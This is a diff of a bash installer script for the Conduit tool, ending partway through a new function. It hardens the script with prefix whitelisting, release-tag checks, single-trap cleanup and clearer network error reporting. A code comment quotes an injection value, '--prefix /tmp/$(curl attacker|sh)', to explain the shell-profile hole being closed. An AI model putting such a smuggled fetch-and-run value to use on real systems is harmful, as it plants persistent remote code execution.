@@ -17,9 +17,18 @@
 # whenever you like; until then search works on keyword matching.
 #
 # Usage:
-#   ./install.sh --from-source          # build from this checkout (needs Go)
 #   ./install.sh                        # download a published release
+#   ./install.sh --from-source          # build from this checkout (needs Go)
 #   ./install.sh --from-source --model  # build and fetch the embedding model
+#
+# PIPED INVOCATION
+#
+#   The release path works piped -- `curl ... | bash` -- because everything it
+#   needs is downloaded. --from-source does NOT: it compiles this repository,
+#   and a piped script has no repository to compile. bash sets no BASH_SOURCE
+#   for a script on stdin, so there is nothing to locate a checkout from either.
+#   That combination is detected and reported with clone instructions rather
+#   than left to fail as an unbound-variable error.
 #
 # If you are coming from Conduit 1.x, run scripts/remove-v1.sh first.
 #
@@ -58,13 +67,33 @@ DOWNLOAD_MODEL=false
 MCP_CLIENT="claude-code"
 RELEASE_TAG="latest"
 
+# SUPPORTED_CLIENTS must stay in step with MCPClients() in
+# internal/setup/mcpclient.go. It is duplicated here rather than asked of the
+# binary because the check has to happen before anything is downloaded or
+# built: `--client cursr` used to install the binary, run setup, watch setup
+# shrug, and print "Done." with nothing configured.
+readonly SUPPORTED_CLIENTS="claude-code cursor vscode"
+
 # Populated by detect_platform.
 OS=""
 ARCH=""
 PLATFORM=""
 
-# Temporary working directory, cleaned up on exit.
+# Temporary state, all of it owned by the single EXIT trap below.
+#
+# WORKDIR is the download/build scratch directory. STAGED is the partial copy
+# of the binary sitting inside PREFIX between the cp and the atomic rename.
+# Both are cleaned up by one handler: this used to be two traps, and the second
+# `trap ... EXIT` silently replaced the first, so a failure between them leaked
+# whichever the displaced handler owned.
 WORKDIR=""
+STAGED=""
+
+# Set by resolve_release_tag, which cannot use command substitution: it needs to
+# report a reason as well as a value, and `die` inside $( ) exits only the
+# subshell.
+RESOLVED_TAG=""
+RESOLVE_HTTP_STATUS=""
 
 # ---------------------------------------------------------------------------
 # Output
@@ -95,12 +124,15 @@ OPTIONS
                         needs cgo.
     --version TAG       Release tag to install, e.g. v2.0.0-beta.1. The default
                         is the newest v2 release. Ignored with --from-source.
-    --prefix DIR        Where to install the binary (default: ~/.local/bin,
-                        or $CONDUIT_PREFIX).
+    --prefix DIR        Where to install the binary. Must be an ABSOLUTE path
+                        with no ASCII shell metacharacters; accented and
+                        non-Latin characters are fine, as are spaces.
+                        Default: ~/.local/bin, or $CONDUIT_PREFIX.
     --model             Download and verify the embedding model after install.
                         A few hundred MB. Off by default.
     --client NAME       AI client to configure: claude-code, cursor, vscode.
-                        Default: claude-code.
+                        Default: claude-code. An unrecognised name is refused
+                        before anything is installed.
     --no-setup          Install the binary only. Do not configure an AI client
                         and do not create the data directory.
     -h, --help          Show this help.
@@ -116,9 +148,17 @@ WHAT IT CHANGES
         bash on Linux  ~/.bashrc
       That marker is what lets uninstall.sh remove the block later without
       guessing at your own edits.
-    - registers the MCP server with an AI client (unless --no-setup)
+    - unless --no-setup, runs `conduit setup`, which creates the data directory
+      (~/.conduit) and its knowledge base file, and registers the MCP server
+      with an AI client
+    - with --model, downloads the embedding model into the data directory
 
-    It writes nothing else, installs no services, and pulls no containers.
+    It installs no services, pulls no containers, and starts nothing at login.
+
+    It does NOT install document extraction tools. `conduit setup` can install
+    poppler (for PDF text) through Homebrew or apt, and this script passes
+    --skip-tools so that an install never runs a package manager unattended.
+    Run `conduit setup` yourself, or install poppler directly, if you want it.
 
 SUPPORTED PLATFORMS
     macOS arm64 (Apple Silicon), Linux x86_64.
@@ -126,11 +166,24 @@ SUPPORTED PLATFORMS
     Intel Macs and Linux arm64 can build from source; there are no published
     binaries for them. Windows is not supported yet -- see install-windows.ps1.
 
-    Published binaries are NOT code-signed or notarised. On macOS, Gatekeeper
-    will quarantine a downloaded one; --from-source avoids that entirely.
+    Published binaries are NOT code-signed or notarised. A binary this script
+    downloads is fetched with curl or wget, which do not set the quarantine
+    attribute, so it runs. One downloaded through a BROWSER does get
+    quarantined; clear it with:
+        xattr -d com.apple.quarantine <file>
+
+PIPED INVOCATION
+    The release path works piped, because everything it needs is downloaded:
+        curl -fsSL https://raw.githubusercontent.com/amlandas/Conduit-AI-Intelligence-Hub/v2/scripts/install.sh | bash
+    --from-source does not: it compiles this repository, and a piped script has
+    none. Clone first for that.
 
 ENVIRONMENT
-    CONDUIT_PREFIX          Default for --prefix.
+    CONDUIT_PREFIX          Default for --prefix. This script holds it to the
+                            same rules as the flag: absolute, and free of ASCII
+                            shell metacharacters. uninstall.sh also searches
+                            there; it requires only that the path be absolute,
+                            and ignores it with a warning otherwise.
     CONDUIT_RELEASE_BASE_URL   Download release artifacts from here instead of
                             GitHub. Announced when used. Checksum verification
                             still applies.
@@ -142,6 +195,8 @@ UPGRADING FROM CONDUIT 1.x
     containers. Run scripts/remove-v1.sh first (it defaults to a dry run).
 
 EXAMPLES
+    ./install.sh
+    ./install.sh --version v2.0.0-beta.1
     ./install.sh --from-source
     ./install.sh --from-source --model --client cursor
     ./install.sh --prefix /usr/local/bin
@@ -149,8 +204,191 @@ EOF
 }
 
 # ---------------------------------------------------------------------------
+# Validating what the user handed us
+#
+# Everything in this section runs before a byte is downloaded, a directory is
+# created or a profile is touched. Two of these checks exist because the value
+# they guard ends up somewhere it can do more than name a file.
+# ---------------------------------------------------------------------------
+
+# shell_quote renders a string as a single-quoted shell word.
+#
+# Single quotes suspend every expansion there is, and the one character they
+# cannot contain is escaped by closing the quote, emitting an escaped quote and
+# reopening: the standard 'it'\''s' idiom.
+shell_quote() {
+    printf "'%s'" "${1//\'/\'\\\'\'}"
+}
+
+# assert_prefix_safe refuses an install prefix that is not a plain absolute
+# directory name.
+#
+# This is not tidiness. The prefix is written into the user's shell profile, and
+# it used to be interpolated into a DOUBLE-quoted line:
+#
+#     printf 'export PATH="%s:$PATH"\n' "$PREFIX"
+#
+# Double quotes do not suspend command substitution, so
+# `--prefix '/tmp/$(curl attacker|sh)'` wrote a line that executed on every
+# login, in every shell, forever -- not at install time, where someone might
+# notice, but silently thereafter. The write is now single-quoted (see
+# add_to_path), and this check refuses the input outright as well: a prefix
+# containing shell metacharacters is a mistake or an attack in every case, and
+# nothing legitimate is lost by rejecting it.
+#
+# Relative paths are refused for the same reason uninstall.sh refuses a relative
+# --data-dir: "bin" resolves against whatever directory the script was run from,
+# and a PATH entry pointing at a relative path is a different directory in every
+# shell that reads it.
+assert_prefix_safe() {
+    local prefix="$1" source_label="$2"
+
+    [[ -n "${prefix//[[:space:]]/}" ]] || \
+        die "the install prefix is empty (it came from ${source_label})$(prefix_remedy)"
+
+    [[ "$prefix" == /* ]] || die \
+        "the install prefix must be an absolute path.
+
+It came from ${source_label}, and its value was:
+
+    ${prefix}
+
+A relative path resolves against whichever directory this script was run from,
+and the PATH entry written to your shell profile would name a different
+directory in every shell that read it.$(prefix_remedy)"
+
+    # A newline cannot be seen by the character check below -- tr deletes it and
+    # the leftover is an empty line -- so it is tested for on its own. A prefix
+    # containing one would write two lines into the profile, only the first of
+    # which the uninstaller's two-line block removal knows about.
+    case "$prefix" in
+        *"
+"*) die "the install prefix must not contain a newline (it came from ${source_label})$(prefix_remedy)" ;;
+    esac
+
+    # An ASCII whitelist, not a blacklist. Listing the dangerous characters
+    # means every character nobody thought of is permitted, and this value
+    # reaches a file the shell evaluates.
+    #
+    # Non-ASCII bytes are EXEMPT, in two stages: first the allowed ASCII set is
+    # deleted, then every byte >= 0x80. Whatever survives is an ASCII character
+    # outside the allowed set -- which is exactly the question being asked.
+    #
+    # The exemption is not a loosening. The first version of this check deleted
+    # only the ASCII set, so a single accented character survived as "leftover"
+    # and the prefix was refused. /Users/José and /home/müller are ordinary home
+    # directories, so that made the DEFAULT install -- no flags at all --
+    # impossible for anyone whose name does not fit in ASCII, with an error
+    # blaming a --prefix they had never passed.
+    #
+    # No shell metacharacter is >= 0x80: UTF-8 encodes every non-ASCII codepoint
+    # entirely in high bytes, so a multi-byte character cannot smuggle in a `$`
+    # or a backtick. And add_to_path single-quotes the value, which is byte
+    # transparent. Verified: a PATH block naming '/tmp/José bin' sources cleanly
+    # and puts exactly that directory on PATH.
+    local leftover
+    leftover="$(LC_ALL=C printf '%s' "$prefix" \
+                | LC_ALL=C tr -d 'A-Za-z0-9 ._/+@,=-' \
+                | LC_ALL=C tr -d '\200-\377')"
+    if [[ -n "$leftover" ]]; then
+        die "the install prefix contains characters that are not allowed: ${leftover}
+
+It came from ${source_label}, and its value was:
+
+    ${prefix}
+
+The prefix is written into your shell startup file. Characters the shell treats
+specially -- \$ \` \" ' \\ ; & | < > ( ) and the like -- would be interpreted
+there rather than read as part of a directory name.
+
+Allowed: letters, digits, space, accented and non-Latin characters, and
+. _ / + @ , = -
+$(prefix_remedy)"
+    fi
+}
+
+# prefix_remedy suggests the fix that fits wherever the prefix came from.
+#
+# "Use an absolute path" is useless advice to somebody who passed no flag at
+# all: the value came from $HOME, which they cannot usefully retype. For them
+# the answer is to name a prefix explicitly.
+prefix_remedy() {
+    case "$PREFIX_SOURCE" in
+        "--prefix")
+            printf '\n%s' "Pass a different --prefix." ;;
+        "CONDUIT_PREFIX")
+            printf '\n%s' "Unset CONDUIT_PREFIX, or set it to a different directory." ;;
+        *)
+            printf '\n%s' "This is the default prefix, \$HOME/.local/bin, so the value came from your
+home directory rather than from anything you typed. Install somewhere else:
+
+    ./install.sh --prefix /usr/local/bin" ;;
+    esac
+}
+
+# assert_tag_shape refuses a --version value that is not a v2 release tag.
+#
+# The tag is concatenated into a download URL, so it is a path segment, and a
+# value like '../download/v2.0.0-beta.3' traverses out of the release directory
+# while every message the script prints goes on calling it the version being
+# installed. Constraining it to the shape releases actually use -- ^v2\.[0-9A-Za-z.-]+$ --
+# removes both the traversal and the mislabelling.
+#
+# Applied to a tag resolved from the API as well as to one typed by the user:
+# the API is a remote party, and a tag is a remote party's string.
+assert_tag_shape() {
+    local tag="$1" source_label="$2"
+
+    [[ -n "${tag//[[:space:]]/}" ]] || die "${source_label} requires a tag (got an empty value)"
+
+    case "$tag" in
+        v2.?*) ;;
+        *) die "${source_label} must name a v2 release tag, e.g. v2.0.0-beta.1 (got: '${tag}')" ;;
+    esac
+
+    local leftover
+    leftover="$(LC_ALL=C printf '%s' "$tag" | LC_ALL=C tr -d 'A-Za-z0-9.-')"
+    if [[ -n "$leftover" ]]; then
+        die "${source_label} must match v2.<letters, digits, dots, hyphens> (got: '${tag}')
+
+A release tag becomes a path segment in the download URL. Characters outside
+that set could reshape the URL to point somewhere other than the release."
+    fi
+
+    case "$tag" in
+        *..*) die "${source_label} must not contain '..' (got: '${tag}')" ;;
+    esac
+}
+
+# assert_client_supported refuses an AI client this build does not know.
+#
+# Previously an unrecognised name travelled all the way to `conduit setup`,
+# which printed a warning and exited 0 -- so a typo produced a complete install,
+# a cheerful "Done.", and no configured client anywhere. Failing here costs the
+# user a re-run of one command instead.
+assert_client_supported() {
+    local want="$1" known
+    for known in $SUPPORTED_CLIENTS; do
+        [[ "$want" == "$known" ]] && return 0
+    done
+    die "unknown --client: '${want}'
+
+Supported clients: ${SUPPORTED_CLIENTS// /, }"
+}
+
+# ---------------------------------------------------------------------------
 # Arguments
 # ---------------------------------------------------------------------------
+
+# Where the prefix came from, so a refusal names the thing the user actually
+# set -- and does not name one they did not.
+#
+# There are THREE sources, not two. This defaulted to "--prefix", so a refusal
+# triggered by the untouched default (${HOME}/.local/bin, derived entirely from
+# $HOME) told the user their `--prefix` was wrong when they had passed no flag
+# at all. Nothing in that message pointed at the actual cause.
+PREFIX_SOURCE="your home directory (the default prefix is \$HOME/.local/bin)"
+[[ -n "${CONDUIT_PREFIX:-}" ]] && PREFIX_SOURCE="CONDUIT_PREFIX"
 
 while [[ $# -gt 0 ]]; do
     case "$1" in
@@ -159,7 +397,7 @@ while [[ $# -gt 0 ]]; do
         --no-setup)    RUN_SETUP=false; shift ;;
         --prefix)
             [[ $# -ge 2 ]] || die "--prefix requires a directory"
-            PREFIX="$2"; shift 2 ;;
+            PREFIX="$2"; PREFIX_SOURCE="--prefix"; shift 2 ;;
         --version)
             [[ $# -ge 2 ]] || die "--version requires a tag"
             RELEASE_TAG="$2"; shift 2 ;;
@@ -171,19 +409,96 @@ while [[ $# -gt 0 ]]; do
     esac
 done
 
+assert_prefix_safe "$PREFIX" "$PREFIX_SOURCE"
+assert_client_supported "$MCP_CLIENT"
+# "latest" is this script's own sentinel, not a tag; it is resolved against the
+# API and the result is checked there.
+[[ "$RELEASE_TAG" == "latest" ]] || assert_tag_shape "$RELEASE_TAG" "--version"
+
 # ---------------------------------------------------------------------------
 # Helpers
 # ---------------------------------------------------------------------------
 
 have() { command -v "$1" >/dev/null 2>&1; }
 
+# cleanup owns every temporary thing this script creates.
+#
+# ONE handler, deliberately. install_binary used to install a second
+# `trap ... EXIT` for its staging file, which REPLACED this one rather than
+# adding to it -- bash has a single handler per signal. A failure in the copy or
+# the rename then left the whole download directory behind, and the run that
+# reinstated this trap afterwards left the staging file behind instead. Neither
+# leak was visible, because both are cleaned up on the paths that succeed.
 cleanup() {
+    if [[ -n "$STAGED" && -e "$STAGED" ]]; then
+        rm -f -- "$STAGED" || true
+    fi
     if [[ -n "$WORKDIR" && -d "$WORKDIR" ]]; then
-        rm -rf -- "$WORKDIR"
+        rm -rf -- "$WORKDIR" || true
     fi
     return 0
 }
 trap cleanup EXIT
+
+# script_path prints the path this script was invoked as, or nothing.
+#
+# The ":-" is load-bearing. bash sets no BASH_SOURCE at all for a script read
+# from standard input, and under `set -u` bash 3.2 -- still /bin/bash on macOS --
+# aborts on a bare "${BASH_SOURCE[0]}" with
+#
+#     install.sh: line 227: BASH_SOURCE[0]: unbound variable
+#
+# which is what `curl ... | bash -s -- --from-source` used to produce: a message
+# about a shell variable where the actual problem is that there is no checkout.
+script_path() {
+    printf '%s' "${BASH_SOURCE[0]:-}"
+}
+
+# repo_root prints the Conduit checkout this script lives in, or fails.
+repo_root() {
+    local self script_dir
+    self="$(script_path)"
+    [[ -n "$self" ]] || return 1
+
+    script_dir="$(cd -- "$(dirname -- "$self")" 2>/dev/null && pwd)" || return 1
+    (cd -- "${script_dir}/.." 2>/dev/null && pwd) || return 1
+}
+
+# have_checkout reports whether the repository is on this machine, next to us.
+#
+# It decides which instructions the error messages give. Telling a user who
+# piped this script from curl to "run ./scripts/install.sh --from-source" names
+# a file that does not exist on their machine, and they have no way to know that
+# from the message.
+have_checkout() {
+    local root
+    root="$(repo_root)" || return 1
+    [[ -n "$root" && -f "${root}/go.mod" ]]
+}
+
+# from_source_hint prints the instructions that actually work from here.
+from_source_hint() {
+    if have_checkout; then
+        printf '%s' "    ./scripts/install.sh --from-source"
+    else
+        printf '%s' "    git clone https://github.com/${REPO}
+    cd ${REPO##*/}
+    ./scripts/install.sh --from-source"
+    fi
+}
+
+# remove_v1_hint prints how to reach remove-v1.sh from here.
+remove_v1_hint() {
+    if have_checkout; then
+        printf '%s' "    ./scripts/remove-v1.sh            # dry run, shows what it found
+    ./scripts/remove-v1.sh --yes      # remove them"
+    else
+        printf '%s' "    git clone https://github.com/${REPO}
+    cd ${REPO##*/}
+    ./scripts/remove-v1.sh            # dry run, shows what it found
+    ./scripts/remove-v1.sh --yes      # remove them"
+    fi
+}
 
 # sha256_of prints the SHA-256 of a file, on either macOS or Linux.
 sha256_of() {
@@ -222,20 +537,27 @@ detect_platform() {
 # Install from source
 # ---------------------------------------------------------------------------
 
-repo_root() {
-    local script_dir
-    script_dir="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
-    (cd -- "${script_dir}/.." && pwd)
-}
-
 install_from_source() {
     info "Building from source"
 
+    # A checkout is what --from-source compiles, and there are two ways not to
+    # have one: the script was piped from curl (no BASH_SOURCE, nothing to
+    # locate anything from) or it was copied somewhere on its own. Both used to
+    # end in a confusing failure -- an unbound-variable abort for the first, a
+    # "no go.mod at /" for the second -- so both are reported as the same
+    # actionable thing.
     local root
-    root="$(repo_root)"
+    if ! root="$(repo_root)" || [[ -z "$root" ]] || [[ ! -f "${root}/go.mod" ]]; then
+        die "--from-source builds this repository, and there is no Conduit checkout here.
 
-    [[ -f "${root}/go.mod" ]] || \
-        die "no go.mod at ${root}; run this script from a Conduit checkout"
+The release path works without one, including piped from curl:
+
+    ./install.sh                      # newest published v2 release
+
+To build from source, clone first:
+
+$(from_source_hint)"
+    fi
 
     have go || die "Go is not installed. Install Go 1.21+ from https://go.dev/dl/ and retry."
 
@@ -342,7 +664,63 @@ fetch() {
     fi
 }
 
-# resolve_release_tag turns "latest" into a concrete tag.
+# fetch_status downloads a URL and prints the HTTP status code it got.
+#
+# Unlike fetch it does NOT use --fail, because the whole point is to keep the
+# body and the code together: "403 with a rate-limit JSON body" and "200 with a
+# captive portal's login page" are different problems with different remedies,
+# and both are invisible to a bare success/failure.
+#
+# It prints "000" when no HTTP exchange happened at all -- DNS failure, refused
+# connection, TLS rejection.
+fetch_status() {
+    local url="$1" dest="$2"
+
+    local curl_opts=(--location --silent --show-error --output "$dest" --write-out '%{http_code}')
+    local wget_opts=(--quiet --output-document="$dest" --server-response)
+
+    case "$url" in
+        https://*)
+            curl_opts+=(--proto '=https' --proto-redir '=https' --tlsv1.2)
+            wget_opts+=(--https-only)
+            ;;
+    esac
+
+    if have curl; then
+        # `|| true`, NOT `|| printf '000'`.
+        #
+        # --write-out fires whether or not the transfer succeeded, and curl
+        # already prints 000 itself when no HTTP exchange happened. It then
+        # exits non-zero (7 for a refused connection, 6 for DNS), so the old
+        # `|| printf '000'` appended a SECOND 000 and this function returned
+        # "000000". That matched neither the 000 case nor 2xx nor 403, fell
+        # through to the catch-all, and reported a DNS or connection failure as
+        # "a failure at api.github.com, not on this machine" -- exactly
+        # backwards, and it made the no-network branch unreachable.
+        #
+        # The `||` is still needed: without it `set -e` aborts the subshell on
+        # curl's non-zero exit before this function can return. It just must
+        # not write anything.
+        curl "${curl_opts[@]}" "$url" 2>/dev/null || true
+        return 0
+    fi
+
+    if have wget; then
+        # wget prints the response headers to stderr under --server-response.
+        # The LAST status line is the one that matters after redirects.
+        local headers status
+        headers="$(wget "${wget_opts[@]}" "$url" 2>&1 >/dev/null || true)"
+        status="$(printf '%s\n' "$headers" \
+                  | awk '/^[[:space:]]*HTTP\// {print $2}' | tail -1)"
+        printf '%s' "${status:-000}"
+        return 0
+    fi
+
+    die "neither curl nor wget is available; cannot download the release"
+}
+
+# resolve_release_tag turns "latest" into a concrete tag, or explains why it
+# could not.
 #
 # It cannot use https://github.com/OWNER/REPO/releases/latest/download, which is
 # what an installer would normally reach for, because GitHub's "latest" EXCLUDES
@@ -353,28 +731,153 @@ fetch() {
 #
 # So the list endpoint is asked instead and the newest v2 entry is taken. GitHub
 # returns releases newest first, and drafts are not visible unauthenticated.
+#
+# It reports through a RETURN CODE and the RESOLVED_TAG global rather than by
+# calling die, and it is called WITHOUT command substitution. `die` inside $( )
+# exits the subshell and nothing else: the parent carried on, so a 403 printed
+# the correct rate-limit error and then, one line later, the flatly wrong "no
+# Conduit 2.0 release has been published yet". Two contradictory explanations of
+# one failure is worse than either alone.
+readonly RESOLVE_OK=0
+readonly RESOLVE_NETWORK=1       # nothing answered
+readonly RESOLVE_RATE_LIMIT=2    # 403/429 -- the API is refusing us for now
+readonly RESOLVE_HTTP=3          # some other HTTP error
+readonly RESOLVE_UNPARSEABLE=4   # answered, but not with a releases list
+readonly RESOLVE_EMPTY=5         # a real releases list holding no v2 entry
+
 resolve_release_tag() {
     local url="${RELEASE_API_BASE}/repos/${REPO}/releases?per_page=100"
+    local body="${WORKDIR}/releases.json"
 
-    if ! fetch "$url" "${WORKDIR}/releases.json" 2>/dev/null; then
-        die "could not reach the GitHub release API at ${RELEASE_API_BASE}.
+    RESOLVED_TAG=""
+    RESOLVE_HTTP_STATUS="$(fetch_status "$url" "$body")"
 
-Check your network, or install from this checkout instead:
+    case "$RESOLVE_HTTP_STATUS" in
+        000|'')  return "$RESOLVE_NETWORK" ;;
+        403|429) return "$RESOLVE_RATE_LIMIT" ;;
+        2*)      ;;
+        *)       return "$RESOLVE_HTTP" ;;
+    esac
 
-    ./scripts/install.sh --from-source"
-    fi
+    [[ -s "$body" ]] || return "$RESOLVE_UNPARSEABLE"
+
+    # Check the SHAPE of the payload before drawing any conclusion from the
+    # absence of a tag in it.
+    #
+    # The releases endpoint returns a JSON array. A rate-limit message, an API
+    # error object and a captive portal's HTML login page are none of them
+    # arrays, and every one of them contains no "v2." tag -- which the old code
+    # read as "no v2 release has been published", the one explanation that is
+    # certainly wrong. A body that is not a list cannot answer the question
+    # either way, and has to say so.
+    local first
+    first="$(head -c 512 "$body" | tr -d '[:space:]' | cut -c1)"
+    [[ "$first" == "[" ]] || return "$RESOLVE_UNPARSEABLE"
 
     # Deliberately a grep rather than a JSON parser: jq is not installed
     # everywhere, and the only field needed is a tag name matching a narrow
     # pattern. Both spellings are handled because the API's whitespace is not
     # part of its contract.
     local tag
-    tag="$(grep -o '"tag_name"[[:space:]]*:[[:space:]]*"v2\.[^"]*"' "${WORKDIR}/releases.json" \
+    tag="$(grep -o '"tag_name"[[:space:]]*:[[:space:]]*"v2\.[^"]*"' "$body" \
            | sed -e 's/.*"\(v2\.[^"]*\)"$/\1/' \
            | head -1)"
 
-    [[ -n "$tag" ]] || return 1
-    printf '%s' "$tag"
+    [[ -n "$tag" ]] || return "$RESOLVE_EMPTY"
+
+    RESOLVED_TAG="$tag"
+    return "$RESOLVE_OK"
+}
+
+# api_body_excerpt prints a short, printable sample of whatever the API sent.
+#
+# Control characters are stripped and the length is capped: this goes into an
+# error message, and a raw 4 MB HTML page or a terminal escape sequence in it
+# would be worse than saying nothing.
+api_body_excerpt() {
+    local body="${WORKDIR}/releases.json"
+    [[ -s "$body" ]] || { printf '(empty response)'; return 0; }
+    head -c 300 "$body" | LC_ALL=C tr -d '\000-\010\013\014\016-\037\177' | tr '\n' ' '
+}
+
+# die_unresolved reports a failed "latest" resolution in terms of what actually
+# went wrong.
+die_unresolved() {
+    local code="$1"
+
+    case "$code" in
+        "$RESOLVE_NETWORK")
+            die "could not reach the release API at ${RELEASE_API_BASE}.
+
+Nothing answered -- no DNS, no route, or the connection was refused. Check your
+network, or a proxy that needs configuring.
+
+Once you can reach it, or if you already know the tag you want:
+
+    ./install.sh --version v2.0.0-beta.1
+
+To build instead of downloading:
+
+$(from_source_hint)"
+            ;;
+
+        "$RESOLVE_RATE_LIMIT")
+            die "the release API refused this request (HTTP ${RESOLVE_HTTP_STATUS}).
+
+GitHub rate-limits unauthenticated API calls per IP address -- 60 an hour --
+and this is what that looks like. It is not a problem with your install.
+
+Either wait for the limit to reset, or skip the lookup entirely by naming the
+release you want. Downloading a named tag does not use the API at all:
+
+    ./install.sh --version v2.0.0-beta.1
+
+Tags are listed at https://github.com/${REPO}/releases
+
+To build instead of downloading:
+
+$(from_source_hint)"
+            ;;
+
+        "$RESOLVE_HTTP")
+            die "the release API returned HTTP ${RESOLVE_HTTP_STATUS}.
+
+That is a failure at ${RELEASE_API_BASE}, not on this machine. Retry later, or
+name the release you want -- which does not use the API:
+
+    ./install.sh --version v2.0.0-beta.1"
+            ;;
+
+        "$RESOLVE_UNPARSEABLE")
+            die "the release API answered (HTTP ${RESOLVE_HTTP_STATUS}) with something that is not a list of releases.
+
+That is usually a captive portal or a proxy intercepting the request, or an API
+error delivered with a 200. It is NOT evidence that no release exists -- this
+script cannot tell from here, so it will not guess.
+
+The response began:
+
+    $(api_body_excerpt)
+
+Name the release you want to skip the lookup:
+
+    ./install.sh --version v2.0.0-beta.1"
+            ;;
+
+        *)
+            die "no Conduit 2.0 release has been published yet.
+
+The release list at ${RELEASE_API_BASE} was read successfully and holds no v2
+entry.
+
+Build from source instead:
+
+$(from_source_hint)
+
+That needs Go 1.21+ and a C compiler. If you meant to install a 1.x release,
+name it explicitly with --version."
+            ;;
+    esac
 }
 
 install_from_release() {
@@ -389,19 +892,17 @@ install_from_release() {
 
     # Resolve "latest" to a real tag before anything is downloaded, so every
     # message from here on names the version actually being installed.
+    #
+    # Called bare, not in $( ): see resolve_release_tag.
     if [[ "$RELEASE_TAG" == "latest" ]]; then
-        local resolved
-        if ! resolved="$(resolve_release_tag)" || [[ -z "$resolved" ]]; then
-            die "no Conduit 2.0 release has been published yet.
-
-Build from this checkout instead:
-
-    ./scripts/install.sh --from-source
-
-That needs Go 1.21+ and a C compiler. If you meant to install a 1.x release,
-name it explicitly with --version."
+        local rc=0
+        resolve_release_tag || rc=$?
+        if [[ "$rc" -ne 0 || -z "$RESOLVED_TAG" ]]; then
+            die_unresolved "$rc"
         fi
-        RELEASE_TAG="$resolved"
+        # The API is a remote party and this value becomes a URL path segment.
+        assert_tag_shape "$RESOLVED_TAG" "the tag returned by ${RELEASE_API_BASE}"
+        RELEASE_TAG="$RESOLVED_TAG"
     fi
 
     info "Installing from release (${RELEASE_TAG})"
@@ -425,9 +926,9 @@ name it explicitly with --version."
     if ! fetch "$sums_url" "${WORKDIR}/SHA256SUMS" 2>/dev/null; then
         die "release ${RELEASE_TAG} has no SHA256SUMS, so nothing it publishes can be verified.
 
-Check the tag name, or build from this checkout instead:
+Check the tag name, or build from source instead:
 
-    ./scripts/install.sh --from-source"
+$(from_source_hint)"
     fi
 
     local expected
@@ -443,9 +944,9 @@ Check the tag name, or build from this checkout instead:
 This platform (${PLATFORM}) has no prebuilt binary. That release contains:
 ${available}
 
-Build from this checkout instead:
+Build from source instead:
 
-    ./scripts/install.sh --from-source"
+$(from_source_hint)"
     fi
 
     info "Downloading ${tarball}"
@@ -477,15 +978,54 @@ The download was deleted. Do not install this artifact."
 # Placing the binary
 # ---------------------------------------------------------------------------
 
+# preflight_prefix settles everything about the destination BEFORE the network
+# is touched.
+#
+# The writability check used to live in install_binary, which runs after the
+# release has been resolved, the manifest fetched, the tarball downloaded and
+# the checksum verified. A root-owned ~/.local/bin -- not rare, it is what one
+# `sudo pip install --user` leaves behind -- therefore cost the user the whole
+# transfer before telling them the one thing they needed to know first.
+preflight_prefix() {
+    local dest="${PREFIX}/${BINARY}"
+
+    if [[ -e "$PREFIX" && ! -d "$PREFIX" ]]; then
+        die "${PREFIX} exists and is not a directory, so nothing can be installed into it."
+    fi
+
+    mkdir -p -- "$PREFIX" || die "cannot create ${PREFIX}.
+
+Choose another --prefix, or create it yourself with the right ownership."
+
+    [[ -w "$PREFIX" ]] || die "${PREFIX} is not writable by this user.
+
+Choose another --prefix, or fix the ownership:
+
+    sudo chown -R \"\$(id -un)\" ${PREFIX}"
+
+    # A DIRECTORY at the destination is refused rather than worked around.
+    #
+    # `mv -f staged dest` does not fail when dest is a directory: it moves the
+    # file INSIDE it. The install then reported "OK installed <dest>" and exited
+    # 0 with the binary sitting at <dest>/conduit.new.<pid> -- a name nothing
+    # will ever execute, under a directory the user believes is the binary.
+    if [[ -d "$dest" ]]; then
+        die "${dest} is a directory, not a Conduit binary.
+
+Something else owns that name. Remove it, or install elsewhere with --prefix."
+    fi
+}
+
 install_binary() {
     local src="$1"
     local dest="${PREFIX}/${BINARY}"
 
     info "Installing to ${dest}"
 
-    mkdir -p -- "$PREFIX" || die "cannot create ${PREFIX}"
-    [[ -w "$PREFIX" ]] || \
-        die "${PREFIX} is not writable. Choose another --prefix, or create it with the right ownership."
+    # Re-checked here as well as in preflight_prefix: install_binary is the
+    # function that writes, and a guard that lives only in a caller is a guard
+    # the next caller will not have.
+    preflight_prefix
 
     # Replacing a running or previously-installed binary: write beside it and
     # rename, so an interrupted install cannot leave a truncated executable on
@@ -501,33 +1041,98 @@ install_binary() {
         rm -f -- "$stale" || true
     done
 
-    local staged="${dest}.new.$$"
-    # Remove the staging file on any exit from here on, so an interrupted copy
-    # does not become the leftover this function just swept.
-    trap 'rm -f -- "'"$staged"'"' EXIT
+    # Recorded in the global the single EXIT trap reads, rather than installed
+    # as a second trap that would replace the first. See cleanup.
+    STAGED="${dest}.new.$$"
 
-    cp -- "$src" "$staged" || die "could not copy the binary into ${PREFIX}"
-    chmod 755 "$staged"
+    cp -- "$src" "$STAGED" || die "could not copy the binary into ${PREFIX}"
+    chmod 755 "$STAGED"
 
-    if ! mv -f -- "$staged" "$dest"; then
-        rm -f -- "$staged"
+    if ! mv -f -- "$STAGED" "$dest"; then
         die "could not install to ${dest}"
     fi
 
-    # Reinstate the workdir cleanup the staging trap displaced.
-    trap cleanup EXIT
+    # The rename reporting success is not the same as an executable being there.
+    # Verified rather than assumed, because "OK installed" over a destination
+    # that holds no runnable binary is the single most misleading thing this
+    # script could print.
+    #
+    # These two checks come BEFORE STAGED is cleared, and the ordering is the
+    # point. Clearing first told the cleanup trap there was nothing to remove,
+    # so a `mv` that exited 0 without actually moving the file -- an
+    # overlayfs/9p/NFS quirk, or a filesystem that reports success on a rename
+    # it did not perform -- left conduit.new.<pid> orphaned in a directory on
+    # the user's PATH, with nothing left that knew its name. Verifying first
+    # means any such failure still has a live cleanup registration.
+    [[ -f "$dest" ]] || die "nothing was installed at ${dest} (the rename reported success)"
+    [[ -x "$dest" ]] || die "${dest} exists but is not executable"
+
+    STAGED=""   # verified moved; there is nothing left to clean up
 
     success "installed ${dest}"
 
-    # v1 symlinked into /usr/local/bin. A stale symlink there shadows the new
-    # binary for anyone whose PATH prefers it, which looks exactly like the
-    # install having silently done nothing.
-    local legacy="/usr/local/bin/${BINARY}"
-    if [[ -L "$legacy" && "$(readlink "$legacy")" != "$dest" ]]; then
-        warn "${legacy} is a symlink to $(readlink "$legacy")"
-        warn "  It shadows the binary just installed. Remove it with:"
-        warn "    sudo rm ${legacy}"
-    fi
+    warn_about_shadowing "$dest"
+}
+
+# path_index prints a directory's 1-based position in PATH, or 0 if absent.
+path_index() {
+    local want="$1" entry i=1
+    local entries=()
